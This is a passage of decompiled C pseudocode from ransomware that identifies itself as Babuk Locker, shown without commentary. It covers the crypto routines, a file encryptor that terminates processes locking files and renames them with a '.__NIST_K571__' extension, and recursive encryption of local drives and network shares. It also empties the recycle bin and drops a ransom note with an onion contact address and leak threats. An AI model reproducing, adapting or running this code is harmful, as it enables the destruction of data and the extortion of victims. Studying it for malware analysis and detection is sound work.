  result = sub_4030A0(*(_DWORD *)(a1 + 4 * a4) ^ *(_DWORD *)(a1 + 4 * a3), 7);
  *(_DWORD *)(a1 + 4 * a3) = result;
  return result;
}

//----- (004031D0) --------------------------------------------------------
int __cdecl sub_4031D0(int a1, int a2)
{
  int result; // eax
  int i; // [esp+0h] [ebp-4h]

  for ( i = 0; i < 16; ++i )
  {
    sub_402FC0(*(_DWORD *)(a1 + 4 * i), (_DWORD *)(a2 + 4 * i));
    result = i + 1;
  }
  return result;
}

//----- (00403210) --------------------------------------------------------
int __cdecl sub_403210(int a1, int a2, int a3)
{
  int i; // [esp+0h] [ebp-48h]
  int v6[16]; // [esp+4h] [ebp-44h] BYREF

  sub_405030((int)v6, a1, 0x40u);
  while ( a3 > 0 )
  {
    sub_4030C0((int)v6, 0, 4, 8, 12);
    sub_4030C0((int)v6, 1, 5, 9, 13);
    sub_4030C0((int)v6, 2, 6, 10, 14);
    sub_4030C0((int)v6, 3, 7, 11, 15);
    sub_4030C0((int)v6, 0, 5, 10, 15);
    sub_4030C0((int)v6, 1, 6, 11, 12);
    sub_4030C0((int)v6, 2, 7, 8, 13);
    sub_4030C0((int)v6, 3, 4, 9, 14);
    a3 -= 2;
  }
  for ( i = 0; i < 16; ++i )
    v6[i] += *(_DWORD *)(a1 + 4 * i);
  return sub_4031D0((int)v6, a2);
}
// 403210: using guessed type int var_44[16];

//----- (00403350) --------------------------------------------------------
int __cdecl sub_403350(_DWORD *a1, int a2, int a3, int a4)
{
  int result; // eax
  int i; // [esp+0h] [ebp-4h]
  int j; // [esp+0h] [ebp-4h]

  qmemcpy(a1, "expand 32-byte k", 16);
  for ( i = 0; i < 8; ++i )
    a1[i + 4] = sub_403030((unsigned __int8 *)(a2 + 4 * i));
  result = 48;
  a1[12] = a3;
  for ( j = 0; j < 3; ++j )
  {
    a1[j + 13] = sub_403030((unsigned __int8 *)(a4 + 4 * j));
    result = j + 1;
  }
  return result;
}

//----- (00403420) --------------------------------------------------------
void __cdecl sub_403420(int a1, unsigned int a2)
{
  unsigned int i; // [esp+0h] [ebp-4h]

  EnterCriticalSection(&CriticalSection);
  sub_402EB0((int)byte_4081D8, 20, (int)&unk_4081F8, (int)&unk_408204, (int)&unk_408204, 44);
  sub_402EB0((int)&unk_408204, 20, (int)&unk_408224, (int)byte_4081D8, (int)byte_4081D8, 44);
  for ( i = 0; i < a2; ++i )
    *(_BYTE *)(i + a1) = byte_4081D8[i];
  LeaveCriticalSection(&CriticalSection);
}

//----- (004034B0) --------------------------------------------------------
int sub_4034B0()
{
  BOOLEAN (__stdcall *SystemFunction036)(PVOID, ULONG); // [esp+0h] [ebp-8h]
  HMODULE hModule; // [esp+4h] [ebp-4h]

  InitializeCriticalSection(&CriticalSection);
  hModule = LoadLibraryA("advapi32.dll");
  SystemFunction036 = (BOOLEAN (__stdcall *)(PVOID, ULONG))GetProcAddress(hModule, "SystemFunction036");
  return ((int (__stdcall *)(char *, int))SystemFunction036)(&byte_4081D8, 88);
}
// 4081D8: using guessed type char byte_4081D8;

//----- (004034F0) --------------------------------------------------------
int __cdecl sub_4034F0(int a1, int a2)
{
  signed int i; // [esp+4h] [ebp-4h]

  sub_403C20(a1, a1 + 72, (int)dword_401808, (int)dword_401850);
  if ( sub_4037B0(a2) < 285 )
    return 0;
  for ( i = sub_4037B0((int)dword_401898) - 1; i < 576; ++i )
    sub_403620(a2, i);
  sub_403F70(a1, a1 + 72, a2);
  return 1;
}
// 401808: using guessed type int dword_401808[18];
// 401850: using guessed type int dword_401850[18];
// 401898: using guessed type int dword_401898[17];

//----- (00403590) --------------------------------------------------------
int __cdecl sub_403590(int a1, int a2, int a3)
{
  unsigned int i; // [esp+0h] [ebp-4h]

  if ( sub_403C70(a2, a2 + 72) || !sub_404050(a2, a2 + 72) )
    return 0;
  for ( i = 0; i < 0x90; ++i )
    *(_BYTE *)(i + a3) = *(_BYTE *)(i + a2);
  sub_403F70(a3, a3 + 72, a1);
  return 1;
}

//----- (00403620) --------------------------------------------------------
unsigned int __cdecl sub_403620(int a1, unsigned int a2)
{
  unsigned int result; // eax

  result = a2 >> 5;
  *(_DWORD *)(a1 + 4 * (a2 >> 5)) &= ~(1 << (a2 & 0x1F));
  return result;
}

//----- (00403650) --------------------------------------------------------
int __cdecl sub_403650(int a1, int a2)
{
  int result; // eax
  int i; // [esp+4h] [ebp-4h]

  for ( i = 0; i < 18; ++i )
  {
    *(_DWORD *)(a1 + 4 * i) = *(_DWORD *)(a2 + 4 * i);
    result = i + 1;
  }
  return result;
}

//----- (00403690) --------------------------------------------------------
int __cdecl sub_403690(int a1, int a2)
{
  char v3[72]; // [esp+0h] [ebp-4Ch] BYREF

  sub_403650((int)v3, a1);
  sub_403650(a1, a2);
  return sub_403650(a2, (int)v3);
}

//----- (004036E0) --------------------------------------------------------
int __cdecl sub_4036E0(int a1, int a2)
{
  int i; // [esp+4h] [ebp-4h]

  for ( i = 0; i < 18; ++i )
  {
    if ( *(_DWORD *)(a1 + 4 * i) != *(_DWORD *)(a2 + 4 * i) )
      return 0;
  }
  return 1;
}

//----- (00403730) --------------------------------------------------------
int __cdecl sub_403730(int a1)
{
  int result; // eax
  int i; // [esp+0h] [ebp-4h]

  for ( i = 0; i < 18; ++i )
  {
    *(_DWORD *)(a1 + 4 * i) = 0;
    result = i + 1;
  }
  return result;
}

//----- (00403760) --------------------------------------------------------
BOOL __cdecl sub_403760(int a1)
{
  unsigned int i; // [esp+4h] [ebp-4h]

  for ( i = 0; i < 0x12 && !*(_DWORD *)(a1 + 4 * i); ++i )
    ;
  return i == 18;
}

//----- (004037B0) --------------------------------------------------------
int __cdecl sub_4037B0(int a1)
{
  unsigned int i; // [esp+0h] [ebp-8h]
  int v3; // [esp+4h] [ebp-4h]
  _DWORD *v4; // [esp+10h] [ebp+8h]

  v3 = 576;
  v4 = (_DWORD *)(a1 + 72);
  while ( v3 > 0 )
  {
    if ( *--v4 )
      break;
    v3 -= 32;
  }
  if ( v3 )
  {
    for ( i = 0x80000000; (i & *v4) == 0; i >>= 1 )
      --v3;
  }
  return v3;
}

//----- (00403820) --------------------------------------------------------
int __cdecl sub_403820(_DWORD *a1, int a2, int a3)
{
  int result; // eax
  int v4; // [esp+8h] [ebp-Ch]
  int j; // [esp+Ch] [ebp-8h]
  int i; // [esp+10h] [ebp-4h]
  char v7; // [esp+24h] [ebp+10h]

  for ( i = 0; i < a3 / 32; ++i )
    a1[i] = 0;
  v4 = 0;
  while ( i < 18 )
    a1[i++] = *(_DWORD *)(a2 + 4 * v4++);
  result = a3 & 0x1F;
  v7 = result;
  if ( result )
  {
    for ( j = 17; j > 0; --j )
      a1[j] = (a1[j - 1] >> (32 - result)) | (a1[j] << result);
    result = (int)a1;
    *a1 <<= v7;
  }
  return result;
}

//----- (00403910) --------------------------------------------------------
int __cdecl sub_403910(_DWORD *a1)
{
  int result; // eax
  int i; // [esp+0h] [ebp-4h]

  result = 4;
  *a1 = 1;
  for ( i = 1; i < 18; ++i )
  {
    a1[i] = 0;
    result = i + 1;
  }
  return result;
}

//----- (00403960) --------------------------------------------------------
BOOL __cdecl sub_403960(_DWORD *a1)
{
  int i; // [esp+4h] [ebp-4h]

  if ( *a1 != 1 )
    return 0;
  for ( i = 1; i < 18 && !a1[i]; ++i )
    ;
  return i == 18;
}

//----- (004039C0) --------------------------------------------------------
int __cdecl sub_4039C0(int a1, int a2, int a3)
{
  int result; // eax
  int i; // [esp+4h] [ebp-4h]

  for ( i = 0; i < 18; ++i )
  {
    *(_DWORD *)(a1 + 4 * i) = *(_DWORD *)(a3 + 4 * i) ^ *(_DWORD *)(a2 + 4 * i);
    result = i + 1;
  }
  return result;
}

//----- (00403A00) --------------------------------------------------------
int __cdecl sub_403A00(int a1, int a2, int a3)
{
  int result; // eax
  signed int i; // [esp+0h] [ebp-50h]
  _DWORD v5[18]; // [esp+4h] [ebp-4Ch] BYREF

  sub_403650((int)v5, a2);
  if ( sub_404130(a3, 0) )
    result = sub_403650(a1, a2);
  else
    result = sub_403730(a1);
  for ( i = 1; i < 571; ++i )
  {
    sub_403820(v5, (int)v5, 1);
    if ( sub_404130((int)v5, 0x23Bu) )
      sub_4039C0((int)v5, (int)v5, (int)dword_401778);
    if ( sub_404130(a3, i) )
      sub_4039C0(a1, a1, (int)v5);
    result = i + 1;
  }
  return result;
}
// 401778: using guessed type int dword_401778[17];
// 403A00: using guessed type _DWORD var_4C[18];

//----- (00403AE0) --------------------------------------------------------
BOOL __cdecl sub_403AE0(_DWORD *a1, int a2)
{
  BOOL result; // eax
  int v3; // esi
  int v4; // [esp+4h] [ebp-128h]
  char v5[72]; // [esp+8h] [ebp-124h] BYREF
  _DWORD v6[18]; // [esp+50h] [ebp-DCh] BYREF
  char v7[72]; // [esp+98h] [ebp-94h] BYREF
  _DWORD v8[18]; // [esp+E0h] [ebp-4Ch] BYREF

  sub_403650((int)v8, a2);
  sub_403650((int)v7, (int)dword_401778);
  sub_403730((int)v5);
  sub_403910(a1);
  while ( 1 )
  {
    result = sub_403960(v8);
    if ( result )
      break;
    v3 = sub_4037B0((int)v8);
    v4 = v3 - sub_4037B0((int)v7);
    if ( v4 < 0 )
    {
      sub_403690((int)v8, (int)v7);
      sub_403690((int)v5, (int)a1);
      v4 = -v4;
    }
    sub_403820(v6, (int)v7, v4);
    sub_4039C0((int)v8, (int)v8, (int)v6);
    sub_403820(v6, (int)v5, v4);
    sub_4039C0((int)a1, (int)a1, (int)v6);
  }
  return result;
}
// 401778: using guessed type int dword_401778[17];
// 403AE0: using guessed type _DWORD var_4C[18];
// 403AE0: using guessed type _DWORD var_DC[18];

//----- (00403C20) --------------------------------------------------------
int __cdecl sub_403C20(int a1, int a2, int a3, int a4)
{
  sub_403650(a1, a3);
  return sub_403650(a2, a4);
}

//----- (00403C50) --------------------------------------------------------
int __cdecl sub_403C50(int a1, int a2)
{
  sub_403730(a1);
  return sub_403730(a2);
}

//----- (00403C70) --------------------------------------------------------
BOOL __cdecl sub_403C70(int a1, int a2)
{
  return sub_403760(a1) && sub_403760(a2);
}

//----- (00403CB0) --------------------------------------------------------
int __cdecl sub_403CB0(int a1, int a2)
{
  _DWORD v3[18]; // [esp+0h] [ebp-4Ch] BYREF

  if ( sub_403760(a1) )
    return sub_403730(a2);
  sub_403AE0(v3, a1);
  sub_403A00((int)v3, (int)v3, a2);
  sub_4039C0((int)v3, (int)v3, a1);
  sub_403A00(a2, a1, a1);
  sub_403A00(a1, (int)v3, (int)v3);
  sub_4039C0(a1, a1, (int)v3);
  sub_403A00((int)v3, (int)v3, a1);
  return sub_4039C0(a2, a2, (int)v3);
}
// 403CB0: using guessed type _DWORD var_4C[18];

//----- (00403D90) --------------------------------------------------------
int __cdecl sub_403D90(int a1, int a2, int a3, int a4)
{
  int result; // eax
  char v5[72]; // [esp+0h] [ebp-124h] BYREF
  char v6[72]; // [esp+48h] [ebp-DCh] BYREF
  _DWORD v7[18]; // [esp+90h] [ebp-94h] BYREF
  char v8[72]; // [esp+D8h] [ebp-4Ch] BYREF

  result = sub_403C70(a3, a4);
  if ( !result )
  {
    if ( sub_403C70(a1, a2) )
    {
      return sub_403C20(a1, a2, a3, a4);
    }
    else if ( sub_4036E0(a1, a3) )
    {
      if ( sub_4036E0(a2, a4) )
        return sub_403CB0(a1, a2);
      else
        return sub_403C50(a1, a2);
    }
    else
    {
      sub_4039C0((int)v6, a2, a4);
      sub_4039C0((int)v5, a1, a3);
      sub_403AE0(v7, (int)v5);
      sub_403A00((int)v7, (int)v7, (int)v6);
      sub_403A00((int)v8, (int)v7, (int)v7);
      sub_4039C0((int)v8, (int)v8, (int)v7);
      sub_4039C0((int)v8, (int)v8, (int)v5);
      sub_4039C0(a1, a1, (int)v8);
      sub_403A00((int)v6, a1, (int)v7);
      sub_4039C0((int)v6, (int)v6, (int)v8);
      sub_4039C0(a2, a2, (int)v6);
      return sub_403650(a1, (int)v8);
    }
  }
  return result;
}
// 403D90: using guessed type _DWORD var_94[18];

//----- (00403F70) --------------------------------------------------------
int __cdecl sub_403F70(int a1, int a2, int a3)
{
  int v4; // [esp+0h] [ebp-9Ch]
  signed int i; // [esp+4h] [ebp-98h]
  char v6[72]; // [esp+8h] [ebp-94h] BYREF
  char v7[72]; // [esp+50h] [ebp-4Ch] BYREF

  v4 = sub_4037B0(a3);
  sub_403C50((int)v6, (int)v7);
  for ( i = v4 - 1; i >= 0; --i )
  {
    sub_403CB0((int)v6, (int)v7);
    if ( sub_404130(a3, i) )
      sub_403D90((int)v6, (int)v7, a1, a2);
  }
  return sub_403C20(a1, a2, (int)v6, (int)v7);
}

//----- (00404050) --------------------------------------------------------
int __cdecl sub_404050(int a1, int a2)
{
  char v3[72]; // [esp+0h] [ebp-94h] BYREF
  char v4[72]; // [esp+48h] [ebp-4Ch] BYREF

  if ( sub_403C70(a1, a2) )
    return 1;
  sub_403A00((int)v4, a1, a1);
  sub_403A00((int)v4, (int)v4, a1);
  sub_4039C0((int)v4, (int)v4, (int)dword_4017C0);
  sub_403A00((int)v3, a2, a2);
  sub_4039C0((int)v4, (int)v4, (int)v3);
  sub_403A00((int)v3, a1, a2);
  return sub_4036E0((int)v4, (int)v3);
}
// 4017C0: using guessed type int dword_4017C0[18];

//----- (00404130) --------------------------------------------------------
int __cdecl sub_404130(int a1, unsigned int a2)
{
  return (*(_DWORD *)(a1 + 4 * (a2 >> 5)) >> (a2 & 0x1F)) & 1;
}

//----- (00404150) --------------------------------------------------------
void __cdecl sub_404150(LPCWSTR lpFileName)
{
  unsigned __int64 v1; // rax
  int v2; // edx
  __int64 v3; // rax
  unsigned __int64 dwFileOffsetLow; // [esp+0h] [ebp-1AB0h]
  __int64 v5; // [esp+8h] [ebp-1AA8h]
  int v6; // [esp+10h] [ebp-1AA0h]
  __int64 j; // [esp+14h] [ebp-1A9Ch]
  HANDLE hProcess; // [esp+1Ch] [ebp-1A94h]
  HANDLE hFileMappingObject; // [esp+20h] [ebp-1A90h]
  WCHAR *lpString1; // [esp+24h] [ebp-1A8Ch]
  HANDLE hFile; // [esp+28h] [ebp-1A88h]
  LPCVOID v12; // [esp+2Ch] [ebp-1A84h]
  LPCVOID lpBaseAddress; // [esp+30h] [ebp-1A80h]
  UINT i; // [esp+34h] [ebp-1A7Ch]
  LARGE_INTEGER FileSize; // [esp+38h] [ebp-1A78h] BYREF
  UINT pnProcInfoNeeded; // [esp+40h] [ebp-1A70h] BYREF
  DWORD dwRebootReasons; // [esp+44h] [ebp-1A6Ch] BYREF
  UINT pnProcInfo; // [esp+48h] [ebp-1A68h] BYREF
  DWORD pSessionHandle; // [esp+4Ch] [ebp-1A64h] BYREF
  RM_PROCESS_INFO dwProcessId[10]; // [esp+50h] [ebp-1A60h] BYREF
  WCHAR v21[34]; // [esp+1A68h] [ebp-48h] BYREF

  v6 = 1;
  SetFileAttributesW(lpFileName, 0x80u);
  while ( 1 )
  {
    hFile = CreateFileW(lpFileName, 0xC0000000, 1u, 0, 3u, 0x80u, 0);
    if ( hFile != (HANDLE)-1 )
      break;
    if ( !v6 )
      return;
    sub_405000((int)v21, 0, 0x42u);
    if ( RmStartSession(&pSessionHandle, 0, v21) )
      return;
    if ( !RmRegisterResources(pSessionHandle, 1u, &lpFileName, 0, 0, 0, 0) )
    {
      pnProcInfo = 10;
      if ( !RmGetList(pSessionHandle, &pnProcInfoNeeded, &pnProcInfo, dwProcessId, &dwRebootReasons) )
      {
        for ( i = 0; i < pnProcInfo; ++i )
        {
          if ( dwProcessId[i].ApplicationType != RmExplorer
            && dwProcessId[i].ApplicationType != RmCritical
            && GetCurrentProcessId() != dwProcessId[i].Process.dwProcessId )
          {
            hProcess = OpenProcess(0x100001u, 0, dwProcessId[i].Process.dwProcessId);
            if ( hProcess != (HANDLE)-1 )
            {
              TerminateProcess(hProcess, 0);
              WaitForSingleObject(hProcess, 0x1388u);
              CloseHandle(hProcess);
            }
          }
        }
      }
    }
    RmEndSession(pSessionHandle);
    v6 = 0;
  }
  GetFileSizeEx(hFile, &FileSize);
  hFileMappingObject = CreateFileMappingA(hFile, 0, 4u, 0, 0, 0);
  if ( hFileMappingObject )
  {
    if ( FileSize.QuadPart <= 41943040 )
    {
      if ( FileSize.QuadPart > 0 )
      {
        v12 = MapViewOfFile(hFileMappingObject, 0xF001Fu, 0, 0, FileSize.LowPart);
        if ( v12 )
        {
          sub_402EB0((int)&unk_408398, 20, (int)&unk_4083D8, (int)v12, (int)v12, FileSize.LowPart);
          sub_402EB0((int)&unk_4083B8, 20, (int)&unk_4083D8, (int)v12, (int)v12, FileSize.LowPart);
          UnmapViewOfFile(v12);
        }
      }
    }
    else
    {
      LODWORD(v1) = sub_407200(FileSize.QuadPart, 10485760i64);
      LODWORD(v5) = sub_407200(v1, 3i64);
      HIDWORD(v5) = v2;
      for ( j = 0i64; j < 3; ++j )
      {
        v3 = sub_4072B0(j, v5);
        dwFileOffsetLow = sub_4072B0(v3, 10485760i64);
        lpBaseAddress = MapViewOfFile(
                          hFileMappingObject,
                          0xF001Fu,
                          HIDWORD(dwFileOffsetLow),
                          dwFileOffsetLow,
                          0xA00000u);
        if ( lpBaseAddress )
        {
          sub_402EB0((int)&unk_408398, 20, (int)&unk_4083D8, (int)lpBaseAddress, (int)lpBaseAddress, 10485760);
          sub_402EB0((int)&unk_4083B8, 20, (int)&unk_4083D8, (int)lpBaseAddress, (int)lpBaseAddress, 10485760);
          UnmapViewOfFile(lpBaseAddress);
        }
      }
    }
    CloseHandle(hFileMappingObject);
  }
  FlushFileBuffers(hFile);
  CloseHandle(hFile);
  lpString1 = (WCHAR *)sub_404FC0(0x10000);
  if ( lpString1 )
  {
    lstrcpyW(lpString1, lpFileName);
    lstrcatW(lpString1, L".__NIST_K571__");
    MoveFileExW(lpFileName, lpString1, 9u);
    sub_404F90(lpString1);
  }
}
// 40422C: variable 'v1' is possibly undefined
// 404237: variable 'v2' is possibly undefined
// 404150: using guessed type WCHAR var_48[34];

//----- (00404620) --------------------------------------------------------
void __cdecl sub_404620(LPCWSTR lpString2, unsigned int a2)
{
  HANDLE hFile; // [esp+0h] [ebp-26Ch]
  HANDLE hFindFile; // [esp+4h] [ebp-268h]
  unsigned int i; // [esp+8h] [ebp-264h]
  int j; // [esp+Ch] [ebp-260h]
  WCHAR *lpString1; // [esp+10h] [ebp-25Ch]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+14h] [ebp-258h] BYREF
  DWORD NumberOfBytesWritten; // [esp+264h] [ebp-8h] BYREF

  lpString1 = (WCHAR *)sub_404FC0(0x10000);
  if ( lpString1 )
  {
    lstrcpyW(lpString1, lpString2);
    lstrcatW(lpString1, L"\\*");
    hFindFile = FindFirstFileW(lpString1, &FindFileData);
    if ( hFindFile != (HANDLE)-1 )
    {
      do
      {
        for ( i = 0; i < 0x1F; ++i )
        {
          if ( !lstrcmpiW(FindFileData.cFileName, (&::lpString2)[i]) )
            goto LABEL_19;
        }
        lstrcpyW(lpString1, lpString2);
        lstrcatW(lpString1, &word_401BB4);
        lstrcatW(lpString1, FindFileData.cFileName);
        if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
        {
          if ( a2 <= 0xF )
            sub_404620(lpString1, a2 + 1);
        }
        else if ( lstrcmpW(FindFileData.cFileName, L"How To Restore Your Files.txt") )
        {
          for ( j = lstrlenW(FindFileData.cFileName); j >= 0; --j )
          {
            if ( FindFileData.cFileName[j] == 46 )
            {
              if ( !lstrcmpW(&FindFileData.cFileName[j], L".__NIST_K571__") )
                goto LABEL_19;
              break;
            }
          }
          sub_404150(lpString1);
        }
LABEL_19:
        ;
      }
      while ( FindNextFileW(hFindFile, &FindFileData) );
      FindClose(hFindFile);
      lstrcpyW(lpString1, lpString2);
      lstrcatW(lpString1, L"\\How To Restore Your Files.txt");
      hFile = CreateFileW(lpString1, 0x40000000u, 1u, 0, 1u, 0, 0);
      if ( hFile != (HANDLE)-1 )
      {
        WriteFile(
          hFile,
          "----------- [ Hello! ] ------------->\r\n"
          "\r\n"
          "       ****BY BABUK LOCKER****\r\n"
          "\r\n"
          "What happend?\r\n"
          "----------------------------------------------\r\n"
          "Your computers and servers are encrypted, backups are deleted from your network and copied. We use strong encr"
          "yption algorithms, so you cannot decrypt your data.\r\n"
          "But you can restore everything by purchasing a special program from us - a universal decoder. This program wil"
          "l restore your entire network.\r\n"
          "Follow our instructions below and you will recover all your data.\r\n"
          "If you continue to ignore this for a long time, we will start reporting the hack to mainstream media and posti"
          "ng your data to the dark web.\r\n"
          "\r\n"
          "What guarantees?\r\n"
          "----------------------------------------------\r\n"
          "We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our inte"
          "rests.\r\n"
          "All our decryption software is perfectly tested and will decrypt your data. We will also provide support in ca"
          "se of problems.\r\n"
          "We guarantee to decrypt one file for free. Go to the site and contact us.\r\n"
          "\r\n"
          "How to contact us? \r\n"
          "----------------------------------------------\r\n"
          "Using TOR Browser ( https://www.torproject.org/download/ ):\r\n"
          "http://babukq4e2p4wu4iq.onion/login.php?id=8M60J4vCbbkKgM6QnA07E9qpkn0Qk7\r\n"
          "\r\n"
          "!!! DANGER !!!\r\n"
          "DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them. \r\n"
          "!!! DANGER !!",
          0x558u,
          &NumberOfBytesWritten,
          0);
        CloseHandle(hFile);
      }
    }
    sub_404F90(lpString1);
  }
}

//----- (004048A0) --------------------------------------------------------
DWORD __stdcall StartAddress(WCHAR *lpThreadParameter)
{
  sub_404620(lpThreadParameter, 0);
  sub_404F90(lpThreadParameter);
  return 0;
}

//----- (004048D0) --------------------------------------------------------
int __cdecl sub_4048D0(LPNETRESOURCEW lpNetResource)
{
  int result; // eax
  DWORD i; // [esp+0h] [ebp-14h]
  HANDLE hEnum; // [esp+4h] [ebp-10h] BYREF
  DWORD BufferSize; // [esp+8h] [ebp-Ch] BYREF
  DWORD cCount; // [esp+Ch] [ebp-8h] BYREF
  LPNETRESOURCEW lpNetResourcea; // [esp+1Ch] [ebp+8h]

  cCount = -1;
  BufferSize = 0x4000;
  result = WNetOpenEnumW(2u, 0, 0x13u, lpNetResource, &hEnum);
  if ( !result )
  {
    lpNetResourcea = (LPNETRESOURCEW)sub_404FC0(BufferSize);
    if ( lpNetResourcea )
    {
      while ( !WNetEnumResourceW(hEnum, &cCount, lpNetResourcea, &BufferSize) )
      {
        for ( i = 0; i < cCount; ++i )
        {
          if ( (lpNetResourcea[i].dwUsage & 2) != 0 )
            sub_4048D0(&lpNetResourcea[i]);
          else
            sub_404620(lpNetResourcea[i].lpRemoteName, 0);
        }
      }
      sub_404F90(lpNetResourcea);
    }
    return WNetCloseEnum(hEnum);
  }
  return result;
}

//----- (004049C0) --------------------------------------------------------
void __noreturn start()
{
  const CHAR *CommandLineA; // eax
  DWORD v1; // [esp+4h] [ebp-274h]
  LPWSTR lpRemoteName; // [esp+8h] [ebp-270h]
  UINT DriveTypeW; // [esp+Ch] [ebp-26Ch]
  HANDLE hFile; // [esp+10h] [ebp-268h]
  _DWORD *v5; // [esp+14h] [ebp-264h]
  int i; // [esp+18h] [ebp-260h]
  DWORD m; // [esp+1Ch] [ebp-25Ch]
  DWORD LogicalDrives; // [esp+20h] [ebp-258h]
  DWORD k; // [esp+24h] [ebp-254h]
  int v10; // [esp+28h] [ebp-250h]
  HANDLE *lpHandles; // [esp+2Ch] [ebp-24Ch]
  LPWSTR lpString1; // [esp+30h] [ebp-248h]
  unsigned __int16 j; // [esp+34h] [ebp-244h]
  DWORD nCount; // [esp+38h] [ebp-240h]
  DWORD nLength; // [esp+3Ch] [ebp-23Ch] BYREF
  struct _SYSTEM_INFO SystemInfo; // [esp+40h] [ebp-238h] BYREF
  DWORD NumberOfBytesWritten; // [esp+64h] [ebp-214h] BYREF
  int v18; // [esp+68h] [ebp-210h] BYREF
  WCHAR Buffer[260]; // [esp+6Ch] [ebp-20Ch] BYREF

  v10 = 0;
  v18 = 0;
  CommandLineA = GetCommandLineA();
  v5 = sub_4025A0(CommandLineA, &v18);
  if ( v18 > 1 )
  {
    for ( i = 1; i < v18; ++i )
    {
      if ( lstrcmpA((LPCSTR)v5[1], "-lanfirst") )
      {
        if ( lstrcmpA((LPCSTR)v5[1], "-lansecond") )
        {
          if ( !lstrcmpA((LPCSTR)v5[1], "-nolan") )
            v10 = -1;
        }
        else
        {
          v10 = 0;
        }
      }
      else
      {
        v10 = 1;
      }
    }
  }
  SetProcessShutdownParameters(0, 0);
  sub_404F80();
  sub_402AE0();
  sub_402D30();
  sub_402A30();
  SHEmptyRecycleBinA(0, 0, 7u);
  GetSystemInfo(&SystemInfo);
  v1 = 2 * SystemInfo.dwNumberOfProcessors;
  nCount = 0;
  lpHandles = (HANDLE *)sub_404FC0(8 * SystemInfo.dwNumberOfProcessors);
  if ( lpHandles )
  {
    sub_4034B0();
    sub_403420((int)&unk_408230, 0x48u);
    sub_4034F0((int)&unk_408278, (int)&unk_408230);
    sub_403590((int)&unk_408230, (int)dword_401BB8, (int)byte_408308);
    sub_4053A0(byte_408398, byte_408308, 72);
    sub_4053A0(byte_4083B8, byte_408308, 144);
    sub_405030((int)&unk_4083D8, (int)byte_408308, 0xCu);
    GetEnvironmentVariableW(L"APPDATA", Buffer, 0xF4u);
    lstrcatW(Buffer, L"\\ecdh_pub_k.bin");
    NumberOfBytesWritten = 0;
    hFile = CreateFileW(Buffer, 0x40000000u, 1u, 0, 1u, 0x80u, 0);
    if ( hFile != (HANDLE)-1 )
    {
      WriteFile(hFile, &unk_408278, 0x90u, &NumberOfBytesWritten, 0);
      CloseHandle(hFile);
      if ( v10 )
        sub_4048D0(0);
      sub_402770();
      LogicalDrives = GetLogicalDrives();
      if ( LogicalDrives )
      {
        for ( j = 65; j <= 0x5Au; ++j )
        {
          if ( (LogicalDrives & 1) != 0 )
          {
            if ( nCount >= v1 )
            {
              WaitForMultipleObjects(nCount, lpHandles, 1, 0xFFFFFFFF);
              for ( k = 0; k < nCount; ++k )
                CloseHandle(lpHandles[k]);
              nCount = 0;
            }
            lpString1 = (LPWSTR)sub_404FC0(14);
            lstrcpyW(lpString1, L"\\\\?\\");
            lstrcpyW(lpString1 + 5, L":");
            lpString1[4] = j;
            DriveTypeW = GetDriveTypeW(lpString1);
            if ( DriveTypeW && DriveTypeW != 5 )
            {
              if ( DriveTypeW != 4 )
              {
                lpHandles[nCount++] = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, lpString1, 0, 0);
                goto LABEL_33;
              }
              nLength = 260;
              lpRemoteName = (LPWSTR)sub_404FC0(520);
              if ( lpRemoteName && !WNetGetConnectionW(lpString1 + 4, lpRemoteName, &nLength) )
                lpHandles[nCount++] = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, lpRemoteName, 0, 0);
            }
            sub_404F90(lpString1);
          }
LABEL_33:
          LogicalDrives >>= 1;
        }
      }
      if ( !v10 )
        sub_4048D0(0);
      WaitForMultipleObjects(nCount, lpHandles, 1, 0xFFFFFFFF);
      for ( m = 0; m < nCount; ++m )
        CloseHandle(lpHandles[m]);
    }
    sub_404F90(lpHandles);
  }
  sub_402A30();
  ExitProcess(0);
}
// 401BB8: using guessed type int dword_401BB8[36];
// 4049C0: using guessed type void __noreturn start();
// 408308: using guessed type _BYTE byte_408308[144];
// 408398: using guessed type _BYTE byte_408398[32];
// 4083B8: using guessed type _BYTE byte_4083B8[32];

//----- (00404F80) --------------------------------------------------------
void sub_404F80()
{
  InitializeCriticalSection(&stru_4083E4);
}

//----- (00404F90) --------------------------------------------------------
void __cdecl sub_404F90(LPVOID lpMem)
{
  HANDLE ProcessHeap; // eax

  EnterCriticalSection(&stru_4083E4);
  ProcessHeap = GetProcessHeap();
  HeapFree(ProcessHeap, 0, lpMem);
  LeaveCriticalSection(&stru_4083E4);
}

//----- (00404FC0) --------------------------------------------------------
LPVOID __cdecl sub_404FC0(int a1)
{
  HANDLE ProcessHeap; // eax
  LPVOID v3; // [esp+0h] [ebp-4h]

  EnterCriticalSection(&stru_4083E4);
  ProcessHeap = GetProcessHeap();
  v3 = HeapAlloc(ProcessHeap, 8u, a1 + 64);
  LeaveCriticalSection(&stru_4083E4);
  return v3;
}

//----- (00405000) --------------------------------------------------------
unsigned int __cdecl sub_405000(int a1, char a2, unsigned int a3)
{
  unsigned int result; // eax
  unsigned int i; // [esp+0h] [ebp-4h]

  for ( i = 0; i < a3; ++i )
  {
    *(_BYTE *)(i + a1) = a2;
    result = i + 1;
  }
  return result;
}

//----- (00405030) --------------------------------------------------------
unsigned int __cdecl sub_405030(int a1, int a2, unsigned int a3)
{
  unsigned int result; // eax
  unsigned int i; // [esp+0h] [ebp-4h]

  for ( i = 0; i < a3; ++i )
  {
    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2);
    result = i + 1;
  }
  return result;
}

//----- (00405110) --------------------------------------------------------
_DWORD *__cdecl sub_405110(_DWORD *a1)
{
  _DWORD *result; // eax

  *a1 = 1779033703;
  a1[1] = -1150833019;
  a1[2] = 1013904242;
  a1[3] = -1521486534;
  a1[4] = 1359893119;
  a1[5] = -1694144372;
  a1[6] = 528734635;
  a1[7] = 1541459225;
  result = a1;
  a1[8] = 0;
  a1[9] = 0;
  return result;
}

//----- (004051C0) --------------------------------------------------------
unsigned int *__cdecl sub_4051C0(unsigned int *a1, _BYTE *a2, int a3)
{
  unsigned int *result; // eax
  __int64 v4; // kr00_8
  int v5; // [esp+0h] [ebp-4h]

  result = a1;
  v5 = a1[8] & 0x3F;
  while ( a3 )
  {
    *((_BYTE *)a1 + v5 + 40) = *a2;
    ++v5;
    ++a2;
